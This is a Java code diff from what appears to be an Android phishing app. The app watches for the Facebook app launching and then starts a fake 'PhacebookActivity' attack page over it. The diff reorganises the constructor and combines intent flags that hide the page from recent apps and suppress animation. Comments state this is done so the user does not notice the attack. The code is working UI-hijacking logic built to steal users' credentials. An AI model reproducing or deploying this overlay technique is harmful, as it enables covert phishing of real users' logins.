@@ -12,6 +12,12 @@ public class FacebookLaunchTarget extends TrackTarget {
 	// Context required to start up activities
 	private Context m_context;
 	
+	public FacebookLaunchTarget(Context context) {
+		super("ActivityManager", "I", "cmp=com.facebook.katana");
+		m_context = context;
+		m_handler = new FacebookLaunchHandler();
+	}
+	
 	private class FacebookLaunchHandler extends Handler {
 		@Override
 		public void handleMessage(Message msg) {
@@ -20,24 +26,11 @@ public class FacebookLaunchTarget extends TrackTarget {
 		}
 	};
 	
-	public FacebookLaunchTarget(Context context) {
-		super("ActivityManager", "I", "cmp=com.facebook.katana");
-		m_context = context;
-		m_handler = new FacebookLaunchHandler();
-	}
-	
 	private void launchAttackPage() {
 		Intent attackIntent = new Intent(m_context, PhacebookActivity.class);
-		
-		//attackIntent.setFlags(Intent.FLAG_ACTIVITY_);
 		// Hide it from the user history
-		attackIntent.setFlags(Intent.FLAG_ACTIVITY_EXCLUDE_FROM_RECENTS);
 		// Do not animate! Animation only brings attention to the attack
-		attackIntent.setFlags(Intent.FLAG_ACTIVITY_NO_ANIMATION);
-		
-		attackIntent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
-		
-		//attackIntent.setClassName("com.google.android.apps.plus", "com.google.android.apps.plus/.phone.HomeActivity");
+		attackIntent.setFlags(Intent.FLAG_ACTIVITY_EXCLUDE_FROM_RECENTS | Intent.FLAG_ACTIVITY_NO_ANIMATION | Intent.FLAG_ACTIVITY_NEW_TASK);
 		m_context.startActivity(attackIntent);
 	}
 
